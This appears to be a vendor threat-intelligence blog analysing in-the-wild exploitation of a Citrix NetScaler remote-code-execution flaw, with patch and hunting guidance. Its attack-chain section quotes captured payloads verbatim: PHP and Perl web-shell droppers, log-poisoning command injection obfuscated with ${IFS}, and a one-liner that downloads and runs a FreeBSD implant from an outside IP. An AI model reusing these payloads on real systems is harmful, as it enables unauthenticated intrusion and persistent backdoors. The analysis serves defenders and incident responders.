IntroductionOn September 27, 2026, Citrix disclosed CVE-2026-88771, a critical remote code execution (RCE) vulnerability affecting NetScaler Application Delivery Controller (ADC) and NetScaler Gateway. The vulnerability carries a CVSS v3.1 score of 9.8 according to NVD and a CVSS v4.0 score of 9.5 according to the Citrix security bulletin CTX697096. The vulnerability allows unauthenticated attackers to execute arbitrary commands on affected appliances. Exploitation requires no optional features to be enabled.Citrix confirmed exploitation on unmitigated appliances, and the US’s Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-88771 to its Known Exploited Vulnerabilities catalog following reports of active exploitation worldwide. Citrix has since disclosed another critical vulnerability affecting NetScaler ADC and NetScaler Gateway, CVE-2026-107406, which can lead to RCE or denial of service. CVE-2026-107406 affects appliances configured as SAML service provider or identity provider depending on the software version. The analysis in this blog focuses on the exploitation of CVE-2026-88771.Zscaler ThreatLabz observed a staged exploitation chain involving access-log poisoning, remote command execution before authentication, appliance fingerprinting, and attempts to deploy multiple web shells. ThreatLabz also observed delivery of a FreeBSD x64 implant from infrastructure that overlapped with activity we previously associated with exploitation of StyleSmuggler (CVE-2026-75650), a vulnerability affecting Adobe Commerce and Magento.This overlap provides an investigative lead but does not establish threat actor attribution. Shared hosting and compromised infrastructure, malware distribution services, or payload reuse by unrelated operators could explain the connection. Fixed ReleasesCitrix recommends installing the following builds or later:Citrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.46 and later releasesCitrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.29 and later releases of 13.1Citrix NetScaler ADC 14.1-FIPS 14.1-73.46 FIPS and later releases of 14.1-FIPSCitrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1.37.283 and later releases of 13.1-FIPS and 13.1-NDcPP RecommendationsOrganizations running NetScaler ADC or NetScaler Gateway should take the following actions immediately:Identify exposed appliances: Inventory every NetScaler appliance and determine its software version, build, and internet exposure.Preserve forensic evidence before updating: Capture a virtual machine snapshot, where applicable, and collect remote syslog data, the NetScaler technical support bundle, and available packet-engine core dumps. CISA warns that updating may remove or reduce forensic visibility.Isolate potentially compromised appliances: Remove potentially compromised appliances from untrusted networks while preserving evidence.Mitigation and response: If your environment includes any of the impacted appliances, it is advisable to proactively hunt for signs of compromise. The following commands, sourced from Sh3llc0de, can help identify suspicious activity.To investigate modifications within the FreeBSD shell, access the NetScaler console, enter shell, and run the commands below:#1. Inspect running processes for suspicious shells spawned by nsppe ps aux | grep -E "sh|bash|python|perl|nc|curl|wget" | grep -v "nsconmsg" # 2. Check startup script rc.netscaler for unauthorized modifications cat /flash/nsconfig/rc.netscaler # 3. Audit cron jobs for suspicious automated scripts crontab -l cat /etc/crontab # 4. Search for newly created or modified web files in webroot directories find /netscaler/ns_gui/ -type f -mtime -3 find /var/netscaler/gui/ -type f -mtime -3 # 5. Review HTTP error logs for abnormal crash dumps or core files ls -la /var/crash/ ls -la /var/core/To determine whether any unauthorized child shells have been launched under the /nobody/ service account, run the following:# Inspect active processes spawned by the nobody service context ps aux | grep -E "(sh|bash|python|perl|nc)" # Audit active network listening sockets for unmapped ports netstat -an | grep LISTENCheck configuration integrity: Compare /etc/httpd.conf, any included configuration files, and other appliance configuration files with those on a known-good system. Pay particular attention to unexpected PHP or CGI enablement.Search for known access paths: Search HTTP access logs for paths/URIs consistent with GET request paths associated with this CVE.Search for staged payloads: Look for User-Agent values of INDEX: followed by Base64-encoded content in HTTP access logs.Search for forged failure messages: Review authentication and system logs for fabricated pitboss PPE messages containing shell syntax.Review outbound connections: Investigate appliance-initiated connections, especially downloads from unfamiliar IP addresses.Rotate exposed secrets after containment: If compromise is confirmed, rotate credentials, tokens, certificates, and other secrets stored on or accessible through the appliance.Upgrade to a fixed release: Install the applicable Citrix build listed above. Attack ChainThe figure below illustrates how attackers exploit CVE-2026-88771 to gain initial access to NetScaler appliances.Figure 1: Attack chain exploiting CVE-2026-88771 to compromise NetScaler appliances. How It WorksThreatLabz discovered a staged log-poisoning chain. The attacker staged a larger post-exploitation payload separately from the shorter command used to trigger its execution.This behavior is consistent with independent technical analysis published by CERT-EU and Unit 42. Step 1: Staging the payload in the HTTP access logThe attacker sent GET requests to common NetScaler paths, as listed below:/logon/LogonPoint/tmindex.html/logon/LogonPoint/index.html/vpn/index.html/logon/tmindex.htmlThe requests carried a distinctive User-Agent value:User-Agent: INDEX: Base64 payload:mkdir -p /var/vpn/bookmark/ /netscaler/ns_gui/vpn/ /var/netscaler/gui/vpn/ /var/netscaler/logon/LogonPoint/ /var/vpn/theme/ /var/netscaler/gui/admin_ui/apex/; echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/vpn/bookmark/Nx_7508.html; echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /netscaler/ns_gui/vpn/Nx_7508.html; echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/netscaler/gui/vpn/Nx_7508.html; echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/netscaler/logon/LogonPoint/Nx_7508.html; echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/vpn/theme/Nx_7508.html; echo "Nx-zD|$(id)|$(uname -a)|$(hostname)|$(cat /etc/nsrelease 2>/dev/null || head -1 /nsconfig/ns.conf 2>/dev/null)" > /var/netscaler/gui/admin_ui/apex/Nx_7508.html; echo '<?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?>' > /var/vpn/bookmark/Nx_7508.php; chmod 755 /var/vpn/bookmark/Nx_7508.php; echo '<?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?>' > /netscaler/ns_gui/vpn/Nx_7508.php; chmod 755 /netscaler/ns_gui/vpn/Nx_7508.php; echo '<?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?>' > /var/netscaler/gui/vpn/Nx_7508.php; chmod 755 /var/netscaler/gui/vpn/Nx_7508.php; echo '<?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?>' > /var/netscaler/logon/LogonPoint/Nx_7508.php; chmod 755 /var/netscaler/logon/LogonPoint/Nx_7508.php; echo '<?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?>' > /var/vpn/theme/Nx_7508.php; chmod 755 /var/vpn/theme/Nx_7508.php; echo '<?php echo "Nx-zD|".shell_exec($_GET[0])."|"; ?>' > /var/netscaler/gui/admin_ui/apex/Nx_7508.php; chmod 755 /var/netscaler/gui/admin_ui/apex/Nx_7508.php; printf "#!/usr/bin/perl
print "Content-Type: text/plain

";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/vpn/bookmark/Nx_7508.pl; chmod 755 /var/vpn/bookmark/Nx_7508.pl; printf "#!/usr/bin/perl
print "Content-Type: text/plain

";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /netscaler/ns_gui/vpn/Nx_7508.pl; chmod 755 /netscaler/ns_gui/vpn/Nx_7508.pl; printf "#!/usr/bin/perl
print "Content-Type: text/plain

";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/netscaler/gui/vpn/Nx_7508.pl; chmod 755 /var/netscaler/gui/vpn/Nx_7508.pl; printf "#!/usr/bin/perl
print "Content-Type: text/plain

";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/netscaler/logon/LogonPoint/Nx_7508.pl; chmod 755 /var/netscaler/logon/LogonPoint/Nx_7508.pl; printf "#!/usr/bin/perl
print "Content-Type: text/plain

";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/vpn/theme/Nx_7508.pl; chmod 755 /var/vpn/theme/Nx_7508.pl; printf "#!/usr/bin/perl
print "Content-Type: text/plain

";print "Nx-zD|";if($ENV{QUERY_STRING}=~/0=(.*)/){print `$1`;}print "|";" > /var/netscaler/gui/admin_ui/apex/Nx_7508.pl; chmod 755 /var/netscaler/gui/admin_ui/apex/Nx_7508.pl; # Enable PHP + Perl CGI, reload Apache sed -i '' 's/php_engine off/php_engine on/g' /etc/httpd.conf; grep -q 'AddHandler cgi-script .pl' /etc/httpd.conf || echo 'AddHandler cgi-script .pl' >> /etc/httpd.conf; kill -HUP $(cat /var/run/httpd.pid)The same Base64-encoded payload in the User-Agent field was sent to multiple paths. This increased the likelihood that it would be written to the HTTP access log file and remain available when the trigger executed.At this stage, the payload in the User-Agent value was not executed. Instead, the log served as storage for the attacker-controlled payload. Step 2: Poisoning the authentication logThe attacker then sent POST requests to the following authentication endpoints, as observed by ThreatLabz:/nf/auth/doAuthentication.do /cgi/loginThe attacker-controlled login value impersonated a NetScaler Packet Processing Engine (PPE) failure record. ThreatLabz observed two variants:Variant 1:pitboss PPE missed too many heartbeatsNSPPE;grep${IFS}INDEX:${IFS}/var/log/htt*| sed${IFS}'s/.*INDEX://;s/".*//'|b64decode${IFS}-r|sh; XVariant 2:pitboss PPE unexpectedly died NSPPE;grep${IFS}INDEX:${IFS}/var/log/htt*| sed${IFS}'s/.*INDEX://;s/".*//'|b64decode${IFS}-r|sh;# XShell commands appended to the forged failure text were designed to instruct the appliance to search HTTP access logs for the INDEX: marker, extract the Base64-encoded data, decode it, and pass the result to a command interpreter to execute.Several variants used ${IFS} (Internal Field Separator, which in bash can represent a space, tab, or newline character) in place of literal spaces. This preserved separation between command arguments while avoiding spaces that might be transformed or rejected during request processing. Inline exploitation variantsIn addition to the staged Base64-encoded payload, ThreatLabz captured a shorter inline variant in the login parameter.Inline variant 1:pitboss PPE unexpectedly died NSPPE;mkdir${IFS}-p${IFS}/var/vpn/bookmark/${IFS} /netscaler/ns_gui/vpn/;echo${IFS}"Nx-zD|$(id)|$(hostname)">/var/vpn/bookmark/Nx_7508.html; echo${IFS}'<?php${IFS}echo${IFS}"Nx-zD|".shell_exec($_GET[0])."|";${IFS}?>' >/var/vpn/bookmark/Nx_7508.php;sed${{IFS}}-i${{IFS}}''${{IFS}} 's/php_engine${{IFS}}off/php_engine${{IFS}}on/g'${{IFS}}/etc/httpd.conf;# XThis variant attempted to:Create web-accessible directories.Write the Nx_7508.html fingerprint file.Install the Nx_7508.php web shell.Enable PHP by modifying /etc/httpd.conf.Inline variant 2:pitboss PPE unexpectedly died NSPPE;fetch${IFS}-o${IFS}/var/kw2s11${IFS}http://209.141.43[.]95/files/kw2-freebsd-x64-s11;chmod${IFS}+x${IFS}/var/kw2s11;/var/kw2s11;# XThe command was designed to download a Rust-based 64-bit FreeBSD binary to /var/kw2s11, grant executable permissions, and run it.ThreatLabz identified the same download server in activity associated with exploitation of CVE-2026-75650, tracked as StyleSmuggler.CVE-2026-75650 is an unauthenticated template-engine injection vulnerability affecting Adobe Commerce and Magento Open Source. Adobe assigned it a CVSS v3.1 score of 10.0 and confirmed exploitation in the wild in security bulletin APSB26-146.The shared download infrastructure is notable because the two vulnerabilities target different platforms:CVE-2026-75650 affects Adobe Commerce and Magento Open Source systems.CVE-2026-88771 affects Citrix NetScaler ADC and Gateway appliances.This overlap raises the possibility that one operator or malware-distribution service maintained payloads for different platforms and opportunistically deployed them through vulnerabilities affecting internet-facing systems.ThreatLabz also observed a burst of exploitation attempts from at least 26 source IP addresses over approximately six to seven minutes. These attempts followed the same log-poisoning and FreeBSD payload-delivery sequence.Each source IP address sent a login request containing:A forged pitboss PPE failure string intended to poison the NetScaler log.A downloader designed to download and execute the 64-bit FreeBSD payload kw2-freebsd-x64-s11. Step 3: Delayed execution by a privileged scriptThe poisoned authentication data was written to /var/log/ns.log. The vulnerability is triggered when the legitimate NetScaler Perl script, /netscaler/ns_monuploadd_err.pl, processes Packet Processing Engine (PPE) failure records as part of the appliance’s diagnostic and core-file handling.Public analysis found that the script searches /var/log/ns.log, rotated NetScaler logs, and /var/log/messages for phrases such as:PPE missed too many heartbeatsPPE unexpectedly diedThe vulnerable Perl script incorporates part of the selected record into a shell command without properly escaping attacker-controlled shell metacharacters. If the script selects the forged record, the appended command executes with the script’s privileges.CERT-EU reported that the script selects the last matching record. This may explain why attackers repeatedly submit the trigger. They are attempting to ensure that their poisoned entry remains the most recent matching line when the maintenance script runs. ConclusionCVE-2026-88771 enables unauthenticated remote command execution on Citrix NetScaler by exploiting the appliance’s logging and diagnostic processes. ThreatLabz captured exploitation attempts involving log poisoning, payload spraying across multiple URLs, directory creation, PHP enablement, and inline payload delivery. How Zscaler can HelpZscaler’s cloud native Zero Trust network access (ZTNA) solution gives users fast, secure access to private apps for all users, from any location. Reduce your attack surface and the risk of lateral threat movement—no more internet-exposed remote access IP addresses, and secure inside-out brokered connections. Easy to deploy and enforce consistent security policies across campus and remote users.Zscaler Private Access™ (ZPA) allows organizations to secure private app access from anywhere. Connect users to apps, never the network, with AI-powered user-to-app segmentation. Prevent lateral threat movement with inside-out connections.Deploy comprehensive cyberthreat and data protection for private apps with integrated application protection, deception, and data protection.The following table shows the typical attack stages and the mitigations recommended by Zscaler.Attack StageRecommended MitigationMinimize the external attack surfaceEliminate externally exposed legacy assets like VPNs and firewalls which are often subject to these zero-day exploitation attempts by leveraging a Zero Trust architecture.Prevent compromiseDetonate unknown second-stage payloads with Advanced Cloud Sandbox.Route server egress through ZIA to detect/block post-compromise activity.Enable SSL/TLS inspection for all traffic, including trusted sources.Enable Advanced Threat Protection to block known C2 domains.Use Advanced Cloud Firewall, to extend C2 controls across all ports/protocols, including emerging C2.Prevent lateral threat movementUse ZPA to enforce least-privilege user-to-app segmentation for crown-jewel apps (employees and third parties).Use ZPA inline inspection to block exploitation attempts against private apps from compromised users.Use Zscaler Deception to detect and contain lateral movement or privilege escalation with decoy assets and accounts.Prevent data lossInspect outbound traffic across channels with Zscaler DLP.
